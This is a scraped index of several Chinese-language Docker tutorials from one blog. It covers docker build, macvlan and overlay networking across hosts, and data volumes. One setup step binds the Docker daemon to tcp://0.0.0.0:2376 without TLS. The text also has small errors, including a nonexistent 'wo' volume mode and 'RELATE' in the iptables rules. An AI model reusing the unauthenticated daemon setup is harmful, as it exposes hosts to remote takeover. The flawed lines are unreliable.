--network: 默认 default。在构建期间设置RUN指令的网络模式 实例\n使用当前目录的 Dockerfile 创建镜像，标签为 runoob/ubuntu:v1。\ndocker build -t runoob/ubuntu:v1 . 使用URL github.com/creack/docker-firefox 的 Dockerfile 创建镜像。\ndocker build github.com/creack/docker-firefox 也可以通过 -f Dockerfile 文件的位置：\n$ docker build -f /path/to/a/Dockerfile . 在 Docker 守护进程执行 Dockerfile 中的指令前，首先会对 Dockerfile 进行语法检查，有语法错误时会返回：\n$ docker build -t test/myapp . Sending build context to Docker daemon 2.048 kB Error response from daemon: Unknown instruction: RUNCMD ","permalink":"https://www.lvbibir.cn/posts/tech/docker_command/","summary":"docker info\u0026mdash;\u0026ndash;查看docker的各项信息 查看docke的各项操作，包括docker版本、容器数量、镜像数量、仓库地址","title":"docker命令"},{"content":"实现跨主机的docker容器之间的通讯：\n使用网桥实现跨主机的连接 docker原生的网络：overlay、macvlan 第三方网络：flaanel、weave、calic 网桥 open vswitch weave macvlan macvlan是Linux操作系统内核提供的网络虚拟化方案之一，更准确的说法是网卡虚拟化方案。它可以为一张物理网卡设置多个mac地址，相当于物理网卡施展了影分身之术，由一个变多个，同时要求物理网卡打开混杂模式。针对每个mac地址，都可以设置IP地址，本来是一块物理网卡连接到交换机，现在是多块虚拟网卡连接到交换机。\n当容器需要直连入物理网络时，可以使用Macvlan。Macvlan本身不创建网络，本质上首先使宿主机物理网卡工作在‘混杂模式’，这样物理网卡的MAC地址将会失效，所有二层网络中的流量物理网卡都能收到。接下来就是在这张物理网卡上创建虚拟网卡，并为虚拟网卡指定MAC地址，实现一卡多用，在物理网络看来，每张虚拟网卡都是一个单独的接口。使用Macvlan有几点需要注意：\n容器直接连接物理网络，由物理网络负责分配IP地址，可能的结果是物理网络IP地址被耗尽，另一个后果是网络性能问题，物理网络中接入的主机变多，广播包占比快速升高而引起的网络性能下降问题。 前边说过了，宿主机上的某张网上需要工作在‘混乱模式’下。 从长远来看bridge网络与overlay网络是更好的选择，原因就是虚拟网络应该与物理网络隔离而不是共享。 优缺点：\n优点是性能非常好 缺点是地址需要手动分配 Macvlan网络有两种模式：bridge模式与802.1q trunk bridge模式。\nbridge模式，Macvlan网络流量直接使用宿主机物理网卡。 802.1q trunk bridge模式，Macvlan网络流量使用Docker动态创建的802.1q子接口，对于路由与过虑，这种模式能够提供更细粒度的控制 环境准备：\n两台centos7 docker版本：18.03 ip：192.168.0.53（node-1） 192.168.0.54（node-2） node-1 node-2 注意：node-1使用的物理网卡是ens33，node-2使用的是ens32 [root@node-1 ~]# ip link show ens33 [root@node-1 ~]# ip link set ens32 promisc on #开启混杂模式，保证多个ip可以通过 [root@node-1 ~]# docker network create -d macvlan --subnet 10.0.0.0/24 --gateway=10.0.0.1 -o parent=ens33 mac_net1 [root@node-1 ~]# docker network ls node-1 docker run -itd --name bbox-1 --ip 10.0.0.11 --network mac_net1 busybox node-2 docker run -itd --name bbox-2 --ip 10.0.0.12 --network mac_net1 busybox node-1 [root@node-1 ~]# docker exec bbox-1 ping 10.0.0.12 [root@node-1 ~]# docker exec bbox-1 ping bbox-2 可以ping通ip，但是无法ping通主机名，因为它没有dns解析 [root@node-1 ~]# brctl show 因为macvlan不依赖于bridge网络，所以查看不到新的桥接网络 [root@node-1 ~]# docker exec bbox-1 ip link 查看到eth0连接到了if2 [root@node-1 ~]# ip link show ens33 可以查看到ens33的编号是2，即bbox-1容器的eth0网卡连接到了ens33物理网卡 [root@node-1 ~]# docker network create -d macvlan -o parent=ens33 mac_net2 Error response from daemon: network dm-b34ee1020a96 is already using parent interface ens33 再创建macvlan网络时发现已经无法再创建，即一块网卡只能添加一个macvlan的地址\n一块网卡绑定多个macvlan地址 [root@node-1 ~]# modinfo 8021q # 查看内核是否支持802.1q封装 [root@node-1 ~]# modprobe 8021q # 如果上条命令执行后没有结果，使用该命令加载该模块 node-1 [root@node-1 ~]# vim /etc/sysconfig/network-scripts/ifcfg-ens33 BOOTPROTO=manual 修改为不需要ip的manual模式\nnode-2 [root@node-2 ~]# vim /etc/sysconfig/network-scripts/ifcfg-ens32 BOOTPROTO=manual node-1 添加两块虚拟网卡，注意与实际的ens32网卡的网段区分开 ens32使用的是192.168.0.0/24网段，虚拟网卡使用的是192.168.1.0/24和192.168.2.0/24\n[root@node-1 ~]# cp -p /etc/sysconfig/network-scripts/ifcfg-ens33 /etc/sysconfig/network-scripts/ifcfg-ens33.10 [root@node-1 ~]# vim /etc/sysconfig/network-scripts/ifcfg-ens33.10 BOOTPROTO=none NAME=ens33.10 DEVICE=ens33.10 ONBOOT=yes IPADDR=192.168.1.10 PREFIX=24 NETWORK=192.168.1.0 VLAN=yes [root@node-1 ~]# cp -p /etc/sysconfig/network-scripts/ifcfg-ens33.10 /etc/sysconfig/network-scripts/ifcfg-ens33.20 [root@node-1 ~]# vim /etc/sysconfig/network-scripts/ifcfg-ens33.20 BOOTPROTO=none NAME=ens33.20 DEVICE=ens33.20 ONBOOT=yes IPADDR=192.168.2.10 PREFIX=24 NETWORK=192.168.2.0 VLAN=yes [root@node-1 ~]# ifup ens33.10 [root@node-1 ~]# ifup ens33.20 [root@node-1 ~]# scp /etc/sysconfig/network-scripts/ifcfg-ens33.10 192.168.0.54:/etc/sysconfig/network-scripts/ifcfg-ens32.10 [root@node-1 ~]# scp /etc/sysconfig/network-scripts/ifcfg-ens33.20 192.168.0.54:/etc/sysconfig/network-scripts/ifcfg-ens32.20 node-2 [root@node-2 ~]# vim /etc/sysconfig/network-scripts/ifcfg-ens32.10 BOOTPROTO=none NAME=ens32.10 DEVICE=ens32.10 ONBOOT=yes IPADDR=192.168.1.20 PREFIX=24 NETWORK=192.168.1.0 VLAN=yes [root@node-2 ~]# vim /etc/sysconfig/network-scripts/ifcfg-ens32.20 BOOTPROTO=none NAME=ens32.20 DEVICE=ens32.20 ONBOOT=yes IPADDR=192.168.2.20 PREFIX=24 NETWORK=192.168.2.0 VLAN=yes [root@node-2 ~]# ifup ens32.10 [root@node-2 ~]# ifup ens32.20 node-1 [root@node-1 ~]# docker network create -d macvlan --subnet 172.16.11.0/24 --gateway 172.16.11.1 -o parent=ens33.10 mac_net11 [root@node-1 ~]# docker network create -d macvlan --subnet 172.16.12.0/24 --gateway 172.16.12.1 -o parent=ens33.20 mac_net12 node-2 [root@node-2 ~]# docker network create -d macvlan --subnet 172.16.11.0/24 --gateway 172.16.11.1 -o parent=ens32.10 mac_net11 [root@node-2 ~]# docker network create -d macvlan --subnet 172.16.12.0/24 --gateway 172.16.12.1 -o parent=ens32.20 mac_net12 node-1 [root@node-2 ~]# docker run -itd --name bbox-11 --ip=172.16.11.11 --network mac_net11 busybox [root@node-2 ~]# docker run -itd --name bbox-12 --ip=172.16.12.11 --network mac_net12 busybox node-2 [root@node-2 ~]# docker run -itd --name bbox-21 --ip=172.16.11.12 --network mac_net11 busybox [root@node-2 ~]# docker run -itd --name bbox-22 --ip=172.16.12.12 --network mac_net12 busybox node-1 [root@node-1 ~]# docker exec bbox-11 ping 172.16.11.12 PING 172.16.11.12 (172.16.11.12): 56 data bytes 64 bytes from 172.16.11.12: seq=0 ttl=64 time=0.867 ms 64 bytes from 172.16.11.12: seq=1 ttl=64 time=1.074 ms 64 bytes from 172.16.11.12: seq=2 ttl=64 time=1.145 ms 64 bytes from 172.16.11.12: seq=3 ttl=64 time=0.938 ms ^C [root@node-1 ~]# docker exec bbox-12 ping 172.16.12.12 PING 172.16.12.12 (172.16.12.12): 56 data bytes 64 bytes from 172.16.12.12: seq=0 ttl=64 time=0.858 ms 64 bytes from 172.16.12.12: seq=1 ttl=64 time=1.140 ms 64 bytes from 172.16.12.12: seq=2 ttl=64 time=0.818 ms 64 bytes from 172.16.12.12: seq=3 ttl=64 time=1.056 ms ^C 在两台系统进行修改，添加网关，修改防火墙策略\nnode-1中记得将ens32更换为ens33\nifconfig ens32.10 172.16.10.1 netmask 255.255.255.0 ifconfig ens32.20 172.16.20.1 netmask 255.255.255.0 iptables -t nat -A POSTROUTING -o ens32.10 -j MASQUERADE iptables -t nat -A POSTROUTING -o ens32 -j MASQUERADE iptables -A FORWARD -i ens32.10 -o ens32 -m state --state RELATE,ESTABLISHED -j ACCEPT iptables -A FORWARD -i ens32 -o ens32.10 -m state --state RELATE,ESTABLISHED -j ACCEPT iptables -A FORWARD -i ens32.10 -o ens32 -j ACCEPT iptables -A FORWARD -i ens32 -o ens32.10 -j ACCEPT overlay 一、跨主机网络概述 二、准备overlay环境 为支持容器的跨主机通信，Docker提供了overlay driver。Docker overlay网络需要一个key-value数据库用于保存网络状态信息，包括Network、Endpoint、IP等。Consul、Etcd和ZooKeeper都是Docker支持的key-value软件，这里我们使用Consul\n1. 环境描述\n节点 系统版本 docker版本 角色 IP地址 node-1 centos7.4 docker-18.03.0 consul 192.168.0.101 node-2 centos7.4 docker-18.03.0 host 192.168.0.102 node-3 centos7.4 docker-18.03.0 host 192.168.0.103 2. 创建consul\nnode-1; [root@node-1 ~]# docker run -d -p 8500:8500 -h consul --name consul progrium/consul -server -bootstrap 容器启动后可以通过192.168.0.101:8500访问到consul 3. 修改docker配置文件 修改node-2和node-3的docker daemon的配置文件/etc/systemd/system/docker.service\n[root@node-2 ~]# vim /etc/systemd/system/docker.service ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2376 -H unix:///var/run/docker.sock --cluster-store=consul://192.168.0.101:8500 --cluster-advertise=ens32:2376 [root@node-2 ~]# systemctl daemon-reload [root@node-2 ~]# systemctl restart docker -H ：tcp：允许tcp连接daemon -H：unix：默认的socket连接方式，支持远程的同时，本地也可以连接 \u0026ndash;cluster-store 指定consul的地址 \u0026ndash;cluster-advertise 告知consul自己的连接地址 node-2和node-3会自动注册到consul数据库中。 三、创建overlay网络 1、在node-2中创建网络 在node-2中创建overlay网络ov_net1\n[root@node-2 ~]# docker network create -d overlay ov_net1 -d overlay：指定driver为overlay [root@node-2 ~]# docker network ls 2、node-3查看创建的网络 注意到ov_net1的 SCOPE 为 global，而其他网络为 local 。在node-3上查看存在的网络:\n[root@node-3 ~]# docker network ls node-3上也能看到ov_net1，只是因为创建ov_net1时将overlay网络信息存入了consul，node-3从consul读取到了新网络数据。之后ov_net1的任何变化都会同步到node-2和node-3. 3、查看ov_net1详细信息\n[root@node-2 ~]# docker network inspect ov_net1 IPAM 是指 IP Address Management，docker自动为 ov_net1 分配的 IP 空间为 10.0.0.0/24 四、在overlay中运行容器 1、创建容器 bbox-1 在 node-2 上运行一个 busybox 容器并连接到 ov_net1.\n[root@node-2 ~]# docker run -itd --name bbox-1 --network ov_net1 busybox 2、查看 bbox-1 网络配置\n[root@node-2 ~]# docker exec bbox-1 ip r default via 172.18.0.1 dev eth1 10.0.0.0/24 dev eth0 scope link src 10.0.0.2 172.18.0.0/16 dev eth1 scope link src 172.18.0.2 bbox-1 有两个网络接口，eth0 和 eth1 eth0 IP 为 10.0.0.2，连接的是overlay网络 ov_net1 eth1 IP 为 172.18.0.2 容器的默认路由是走 eth1，其实，docker 会创建一个 bridge 网络 “docker_gwbridge”，为所有连接到 overlay 网络的容器提供访问外网的能力 [root@node-2 ~]# docker network ls [root@node-2 ~]# docker network inspect docker_gwbridge 从 docker network inspect docker_gwbridge 输出可确认 docker_gwbridge 的 IP 地址范围是 172.18.0.0/16，当前连接的容器就是 bbox-1（172.18.0.2） 而且此网络的网关就是网桥 docker_gwbridge 的 IP 172.18.0.1\n[root@node-2 ~]# ifconfig docker_gwbridge docker_gwbridge: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 172.18.0.1 netmask 255.255.0.0 broadcast 172.18.255.255 inet6 fe80::42:c5ff:fe45:937 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether 02:42:c5:45:09:37 txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 这样容器 bbox-1 就可以通过docker_gwbridge 访问外网\n[root@node-2 ~]# docker exec bbox-1 ping -c 4 www.baidu.com PING www.baidu.com (182.61.200.6): 56 data bytes 64 bytes from 182.61.200.6: seq=0 ttl=53 time=6.721 ms 64 bytes from 182.61.200.6: seq=1 ttl=53 time=7.954 ms 64 bytes from 182.61.200.6: seq=2 ttl=53 time=11.723 ms 64 bytes from 182.61.200.6: seq=3 ttl=53 time=15.105 ms --- www.baidu.com ping statistics --- 4 packets transmitted, 4 packets received, 0% packet loss round-trip min/avg/max = 6.721/10.375/15.105 ms 五、overlay网络连通性 1、node-3 中 运行 bbox-2\n[root@node-3 ~]# docker run -itd --name bbox-2 --network ov_net1 busybox 2、查看 bbox-2 路由情况\n[root@node-3 ~]# docker exec bbox-2 ip r default via 172.18.0.1 dev eth1 10.0.0.0/24 dev eth0 scope link src 10.0.0.3 172.18.0.0/16 dev eth1 scope link src 172.18.0.2 3、互通测试\n[root@node-3 ~]# docker exec bbox-2 ping -c 4 10.0.0.2 PING 10.0.0.2 (10.0.0.2): 56 data bytes 64 bytes from 10.0.0.2: seq=0 ttl=64 time=2.628 ms 64 bytes from 10.0.0.2: seq=1 ttl=64 time=1.004 ms 64 bytes from 10.0.0.2: seq=2 ttl=64 time=1.277 ms 64 bytes from 10.0.0.2: seq=3 ttl=64 time=1.505 ms --- 10.0.0.2 ping statistics --- 4 packets transmitted, 4 packets received, 0% packet loss round-trip min/avg/max = 1.004/1.603/2.628 ms 可见 overlay 网络中的容器可以直接通信，同时docker也实现了DNS服务 4、实现原理 docker 会为每个 overlay 网络创建一个独立的 network namespace，其中会有一个 linux bridge br0， veth pair 一端连接到容器中（即 eth0），另一端连接到 namespace 的 br0 上。 br0 除了连接所有的 veth pair，还会连接一个 vxlan 设备，用于与其他 host 建立 vxlan tunnel。容器之间的数据就是通过这个 tunnel 通信的。逻辑网络拓扑结构如图所示： [root@node-2 ~]# brctl show bridge name bridge id STP enabled interfaces docker0 8000.024217edc413 no docker_gwbridge 8000.0242c5450937 no vethc59120e virbr0 8000.525400b76fd4 yes virbr0-nic [root@node-3 ~]# brctl show bridge name bridge id STP enabled interfaces docker0 8000.0242ef3c7df7 no docker_gwbridge 8000.0242c81afaee no vethf4562a9 virbr0 8000.525400c28478 yes virbr0-nic 要查看 overlay 网络的 namespace 可以在 node-2 和 node-3 上执行 ip netns（请确保在此之前执行过 ln -s /var/run/docker/netns /var/run/netns），可以看到两个 node 上有一个相同的 namespace \u0026ldquo;1-dd91de7599\u0026rdquo;\n[root@node-2 ~]# ln -s /var/run/docker/netns /var/run/netns [root@node-2 ~]# ip netns 6889f61efc4b (id: 1) 1-dd91de7599 (id: 0) [root@node-3 ~]# ln -s /var/run/docker/netns /var/run/netns [root@node-3 ~]# ip netns 8e4722847745 (id: 1) 1-dd91de7599 (id: 0) \u0026ldquo;1-dd91de7599\u0026rdquo; 这就是 ov_net1 的 namespace，查看 namespace 中的 br0 上的设备\n[root@node-2 ~]# ip netns exec 1-dd91de7599 brctl show bridge name bridge id STP enabled interfaces br0 8000.0e7576c7c035 no veth0 vxlan0 六、overlay网络隔离 不同的 overlay 网络是相互隔离的。我们创建第二个 overlay 网络 ov_net2 并运行容器 bbox-3 1、创建网络 ov_net2\n[root@node-2 ~]# docker network create -d overlay ov_net2 2、启动容器 bbox-3\n[root@node-2 ~]# docker run -itd --name bbox-3 --network ov_net2 busybox 3、查看 bbox-3 网络 bbox-3 分配到的 IP 是 10.0.1.2，尝试 ping bbox-1（10.0.0.2）\n[root@node-2 ~]# docker exec -it bbox-3 ip r default via 172.18.0.1 dev eth1 10.0.1.0/24 dev eth0 scope link src 10.0.1.2 172.18.0.0/16 dev eth1 scope link src 172.18.0.3 [root@node-2 ~]# docker exec -it bbox-3 ping -c 4 10.0.0.2 PING 10.0.0.2 (10.0.0.2): 56 data bytes --- 10.0.0.2 ping statistics --- 4 packets transmitted, 0 packets received, 100% packet loss [root@node-2 ~]# docker exec -it bbox-3 ping -c 4 172.18.0.2 PING 172.18.0.2 (172.18.0.2): 56 data bytes --- 172.18.0.2 ping statistics --- 4 packets transmitted, 0 packets received, 100% packet loss ping 失败，可见不同 overlay 网络之间是隔离的，即使通过 docker_gwbridge 也不能通信 如果要实现 bbox-3 和 bbox-1 通信，可以将 bbox-3 也连接到 ov_net1 这时 bbox-3 同时连接到了 ov_net1 和 ov_net2 上\n[root@node-2 ~]# docker network connect ov_net1 bbox-3 [root@node-2 ~]# docker exec bbox-3 ip r default via 172.18.0.1 dev eth1 10.0.0.0/24 dev eth2 scope link src 10.0.0.4 10.0.1.0/24 dev eth0 scope link src 10.0.1.2 172.18.0.0/16 dev eth1 scope link src 172.18.0.3 [root@node-2 ~]# docker exec bbox-3 ping -c 4 10.0.0.2 PING 10.0.0.2 (10.0.0.2): 56 data bytes 64 bytes from 10.0.0.2: seq=0 ttl=64 time=0.184 ms 64 bytes from 10.0.0.2: seq=1 ttl=64 time=0.158 ms 64 bytes from 10.0.0.2: seq=2 ttl=64 time=0.162 ms 64 bytes from 10.0.0.2: seq=3 ttl=64 time=0.093 ms --- 10.0.0.2 ping statistics --- 4 packets transmitted, 4 packets received, 0% packet loss round-trip min/avg/max = 0.093/0.149/0.184 ms docker 默认为 overlay 网络分配 24 位掩码的子网（10.0.X.0/24），所有主机共享这个 subnet，容器启动时会顺序从此空间分配 IP。当然我们也可以通过 \u0026ndash;subnet 指定 IP 空间。\ndocker network create -d overlay --subnet 10.22.1.0/24 ov_net ","permalink":"https://www.lvbibir.cn/posts/tech/docker_rong_qi_kua_zhu_ji_lian_jie/","summary":"实现跨主机的docker容器之间的通讯： 使用网桥实现跨主机的连接 docker原生的网络：overlay、macvlan 第三方网络：flaan","title":"docker容器跨主机连接"},{"content":"什么是数据卷 docker的理念之一就是将应用与其运行的环境打包。通常docker容器的生命周期都是与在容器中运行的程序相一致的，我们对于数据的要求就是持久化；另一方面docker容器之间也需要一个共享文件的渠道。\n数据卷是经过特殊设计的目录，可以绕过联合文件系统（UFS），为一个或者过个容器提供服务 数据卷设计的目的，在于数据的持久化，他完全独立于容器的生存周期，因此，docker不会在容器删除时删除其挂载的数据卷，也不会存在类似的垃圾收集机制，对容器引用的数据卷进行处理 从图片中：\n数据卷独立于docker容器存在，它存在于docker的宿主机中 数据卷可以是目录，也可以是文件 docker容器可以利用数据卷与宿主机共享文件 同一个数据卷可以支持多个容器的访问 数据卷的特点 数据卷在容器启动时初始化，如果容器使用的镜像在挂载点包含了数据，这些数据会拷贝到新初始化的数据卷中 数据卷可以在容器之间共享和重用 可以对数据卷里的内容直接进行修改 数据卷的变化不会影响镜像的更新 数据卷会一直存在，即使挂载数据卷的容器已经被删除 数据卷操作 为容器添加数据卷 docker run -it -v HOST_DIRECTORY:CONTAINER_DIRETORY IMAGE [COMMADN] HOST-DIRECTORY：指定主机目录，不存在时即创建 CONTAINER：指定容器目录，不存在时即创建 示例：\n[root@localhost ~]# docker run -it -v /docker/data_volume:/data_volume busybox /bin/sh / # touch /data_volume/test\t#创建测试文件 / # echo \u0026#34;lvbibir\u0026#34; \u0026gt; /data_volume/test / # cat /data_volume/test lvbibir [root@localhost ~]# cat /docker/data_volume/test\t#验证测试文件 lvbibir [root@localhost ~]# docker ps -l CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES be3fad8d789e busybox \u0026#34;/bin/sh\u0026#34; 6 minutes ago Up 6 minutes elastic_boyd [root@localhost ~]# docker inspect elastic_boyd 为数据卷添加访问权限 docker run -it -v HOST_DIRECTORY:CONTAINER_DIRETORY:r/w IMAGE [COMMADN] 权限可以设置为：\nro：only-read，只读 wo：only-write，只写 rw：write and read，读写 示例：\n[root@localhost ~]# docker run -itd -v /docker/data_volume:/data_volume:ro busybox /bin/sh 3ee3a2b7a97c0a10125d46ee1135bf59af1d97932572d49fdd5c0bb64bf775a5 [root@localhost ~]# docker ps -l CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 3ee3a2b7a97c busybox \u0026#34;/bin/sh\u0026#34; 4 seconds ago Up 3 seconds confident_hopper [root@localhost ~]# docker inspect confident_hopper 使用dockerfile构建包含数据卷的镜像 dockerfile指令： VOLUME [\u0026ldquo;HOST_DIRECTORY\u0026rdquo;]\ndockerfile中配置数据卷无法指定映射到本地的目录 构建好镜像启动容器时，数据卷会进行初始化，docker会在/var/lib/docker/volumes/下为数据卷创建新的随机名字的目录（不同版本该目录位置可能不同，具体以inspect查看到的为准） 使用同一个镜像构建的多个容器，映射的本地目录也不一样 通过数据卷容器来进行容器间的数据共享 示例：\n[root@localhost ~]# cat Dockerfile #For test data_volume FROM busybox:latest VOLUME [\u0026#34;/data_volume1\u0026#34;,\u0026#34;/data_volume2\u0026#34;] CMD /bin/sh [root@localhost ~]# docker build -t test/data_volume . [root@localhost ~]# docker run -itd --name test_data_volume_1 test/data_volume /bin/sh ee8347a4bd3590e8cb65a28e1ebfc5d01e44f2ce70d33a2fa9bbc19782e34f21 [root@localhost ~]# docker exec test_data_volume_1 ls -l / | grep data_volume drwxr-xr-x 2 root root 6 Aug 14 15:20 data_volume1 drwxr-xr-x 2 root root 6 Aug 14 15:20 data_volume2 [root@localhost ~]# docker inspect test_data_volume_1 [root@localhost ~]# docker run -itd --name test_data_volume_2 test/data_volume /bin/sh b4f654706ea15e657cd61bb92d16fa6c6b8eb9129a68b1c9209ea21967175b24 [root@localhost ~]# docker exec test_data_volume_2 ls -l / | grep data_volume drwxr-xr-x 2 root root 6 Aug 14 15:24 data_volume1 drwxr-xr-x 2 root root 6 Aug 14 15:24 data_volume2 [root@localhost ~]# docker inspect test_data_volume_2 数据卷容器 一个命名的容器挂载了数据卷，其他容器通过挂载这个容器实现数据共享，挂载数据卷的容器，就叫做数据卷容器 使用数据卷容器而不是用数据卷直接挂载，可以不暴露宿主机的实际目录 删除数据卷容器对于已经挂载了该容器的容器没有影响，因为数据卷容器只是传递了挂载信息，任何对于目录的更改都不需要通过数据卷容器 从图片中：\n数据卷容器挂载了一个本地目录，其他容器通过连接这个数据卷容器来实现数据的共享 数据卷容器操作 挂载数据卷容器 docker run -it --volumes-from [CONTAINER] IMAGE [COMMAND] CONTAINER必须是已经挂载了卷组的容器，dockerfile和-v两个方式都可以 CONTAINER可以未运行，但必须存在 示例： 创建数据卷容器\n[root@localhost ~]# cat Dockerfile #For test data_volume FROM busybox:latest VOLUME [\u0026#34;/data_volume1\u0026#34;,\u0026#34;/data_volume2\u0026#34;] CMD /bin/sh [root@localhost ~]# docker build -t test/data_volume . [root@localhost ~]# docker run -it --name data_volume_container test/data_volume /bin/sh / # touch /data_volume1/test1 / # touch /data_volume2/test2 / # exit 创建一个容器，挂载数据卷容器进行验证\n[root@localhost ~]# docker run -itd --name test_dvc_1 --volumes-from data_volume_container busybox /bin/sh 6c4afa29df7ef226da7f1f0d394a356d53b92e3b20fa6c4632e7197ba393612c [root@localhost ~]# docker exec test_dvc_1 ls /data_volume1/ test1 [root@localhost ~]# docker exec test_dvc_1 ls /data_volume2/ test2 使用这个新容器对挂载的目录进行更改\n[root@localhost ~]# docker exec test_dvc touch /data_volume1/test2 [root@localhost ~]# docker exec test_dvc ls /data_volume1/ test1 test2 再创建一个新容器验证上一个容器对挂载目录的更改是否生效\n[root@localhost ~]# docker run -itd --name test_dvc_2 --volumes-from data_volume_container busybox /bin/sh 276c24ecd6ee62f35abf24855ffc5416b9abe987c1bb693ec57bf27d241383d2 [root@localhost ~]# docker exec test_dvc_2 ls /data_volume1 test1 test2 [root@localhost ~]# docker inspect --format=\u0026#34;{{.Mounts}}\u0026#34; test_dvc_1 [{volume 1aca4270e7c9ba34b3978638a6bf9e8259c294508207e89b3b9cbb529f4dd4be /var/lib/docker/volumes/1aca4270e7c9ba34b3978638a6bf9e8259c294508207e89b3b9cbb529f4dd4be/_data /data_volume1 local true } {volume d6ebda8735e2c76857d199bd1b96d11c9802d39557d2028bac60f0ec42efc764 /var/lib/docker/volumes/d6ebda8735e2c76857d199bd1b96d11c9802d39557d2028bac60f0ec42efc764/_data /data_volume2 local true }] [root@localhost ~]# docker inspect --format=\u0026#34;{{.Mounts}}\u0026#34; test_dvc_2 [{volume d6ebda8735e2c76857d199bd1b96d11c9802d39557d2028bac60f0ec42efc764 /var/lib/docker/volumes/d6ebda8735e2c76857d199bd1b96d11c9802d39557d2028bac60f0ec42efc764/_data /data_volume2 local true } {volume 1aca4270e7c9ba34b3978638a6bf9e8259c294508207e89b3b9cbb529f4dd4be /var/lib/docker/volumes/1aca4270e7c9ba34b3978638a6bf9e8259c294508207e89b3b9cbb529f4dd4be/_data /data_volume1 local true }] [root@localhost ~]# docker inspect test_dvc_1 [root@localhost ~]# docker inspect test_dvc_2 删除数据卷容器 删除数据卷容器后，已经挂载了这个数据卷容器的容器不受任何影响 数据卷容器只传递链接信息，挂载的数据并不需要通过数据卷容器来进行传输\n数据卷的备份和还原 数据备份 备份这个数据卷容器挂载的所有目录\ndocker run --volumes-from [container] -v $(pwd):/backup [image] tar cvf /backup/backup.tar [container data volume] -v $(pwd):/backup：挂载一个数据卷用于存放备份文件 tar命令：将数据卷容器挂载的目录进行压缩，备份到/backup目录 数据还原 docker run --volumes-from [container] -v $(pwd):/backup [image] tar xvf /backup/backup.tar [container data volume] ","permalink":"https://www.lvbibir.cn/posts/tech/docker_data_volume/","summary":"什么是数据卷 docker的理念之一就是将应用与其运行的环境打包。通常docker容器的生命周期都是与在容器中运行的程序相一致的，我们对于数据","title":"docker数据卷（data volume）"},{"content":"docker简介 Docker 是一个开源项目，诞生于 2013 年初，最初是 dotCloud 公司内部的一个业余项目。它基于 Google 公司推出的 Go 语言实现。 项目后来加入了 Linux 基金会，遵从了 Apache 2.0 协议，项目代码在GitHub (https://github.com/docker/docker) 上进行维护。 Docker 自开源后受到广泛的关注和讨论，以至于 dotCloud 公司后来都改名为 Docker Inc。Redhat 已经在其RHEL6.5 中集中支持 Docker；Google 也在其 PaaS 产品中广泛应用。 Docker 项目的目标是实现轻量级的操作系统虚拟化解决方案。 Docker 的基础是 Linux 容（LXC）等技术。 在 LXC 的基础上 Docker 进行了进一步的封装，让用户不需要去关心容器的管理，使得操作更为简便。用户操作 Docker 的容器就像操作一个快速轻量级的虚拟机一样简单。 下面的图片比较了 Docker 和传统虚拟化方式的不同之处，可见容器是在操作系统层面上实现虚拟化，直接复用本地主机的操作系统，而传统方式则是在硬件层面实现。\n为什么要使用docker 作为一种新兴的虚拟化方式，Docker 跟传统的虚拟化方式相比具有众多的优势。 首先，Docker 容器的启动可以在秒级实现，这相比传统的虚拟机方式要快得多。 其次，Docker 对系统资源的 利用率很高，一台主机上可以同时运行数千个 Docker 容器。 容器除了运行其中应用外，基本不消耗额外的系统资源，使得应用的性能很高，同时系统的开销尽量小。传统虚 拟机方式运行 10 个不同的应用就要起 10 个虚拟机，而Docker 只需要启动 10 个隔离的应用即可。 具体说来，Docker 在如下几个方面具有较大的优势。\n更快速的交付和部署 对开发和运维（devop）人员来说，最希望的就是一次创建或配置，可以在任意地方正常运行。 开发者可以使用一个标准的镜像来构建一套开发容器，开发完成之后，运维人员可以直接使用这个容器来部署代码。 Docker 可以快速创建容器，快速迭代应用程序，并让整个过程全程可见，使团队中的其他成员更容易理解应用程序是如何创建和工作的。 Docker 容器很轻很快！容器的启动时间是秒级的，大量地节约开发、测试、部署的时间。 更高效的虚拟化 Docker 容器的运行不需要额外的 hypervisor 支持，它是内核级的虚拟化，因此可以实现更高的性能和效率。 更轻松的迁移和扩展 Docker 容器几乎可以在任意的平台上运行，包括物理机、虚拟机、公有云、私有云、个人电脑、服务器等。 这种兼容性可以让用户把一个应用程序从一个平台直接迁移到另外一个。 更简单的管理 使用 Docker，只需要小小的修改，就可以替代以往大量的更新工作。所有的修改都以增量的方式被分发和更新，从而实现自动化并且高效的管理。 对比传统虚拟机 docker的应用场景 简化配置 一次构建，多处运行 提升开发效率 应用隔离 多租户环境 为每个容器启用多个不同的容器 快速的部署 代码流水线管理 代码调试 docker镜像 docker镜像是一套使用联合加载技术实现的层叠的只读文件系统，包含基础镜像和附加镜像层\n为什么docker镜像很小 Linux操作系统分别由两部分组成 1.内核空间(kernel) 2.用户空间(rootfs) 内核空间是kernel,Linux刚启动时会加载bootfs文件系统，之后bootf会被卸载掉， 用户空间的文件系统是rootfs,包含常见的目录，如/dev、/proc、/bin、/etc等等 不同的Linux发行版本(红帽，centos，ubuntu等)主要的区别是rootfs, 多个Linux发行版本的kernel差别不大。 每个不同linux发行版的docker镜像只包含对应的rootfs，所以比完整的系统镜像要小得多\ndocker镜像的存储位置 /var/lib/docker(可以使用docker info来进行查看) 写时复制（copy on write） 当一个新容器启动时，读写层是没有任何数据的，当用户需要读取一些文件时，可以直接从只读层进行读取，只有当用户要修改只读层一些文件时，docker才会将该文件从只读层复制出来放在读写层供使用者修改，只读层中的文件是没有改变的\n仓库（repository）与仓库注册服务器（registry） Repository：本身是一个仓库，这个仓库里面可以放具体的镜像，是指具体的某个镜像的仓库，比如Tomcat下面有很多个版本的镜像，它们共同组成了Tomcat的Repository。\nRegistry：镜像的仓库，比如官方的是Docker Hub，它是开源的，也可以自己部署一个，Registry上有很多的Repository，Redis、Tomcat、MySQL等等Repository组成了Registry。\ndocker的C/S模式 用户在Docker Client中运行Docker的各种命令，这些命令会传送给在docker宿主机上运行的docker守护进程，docker的守护进程来实现docker的各种功能 启动docker服务后，docker的守护进程会一直在后台运行\nRemote API docker命令行接口是docker最常用的与守护进程进行通信的接口，docker的二进制命令文件（例如docker run）此时就是docker的Client，docker也提供了其他的接口：Remote API 用户可以通过编写程序调用Remote 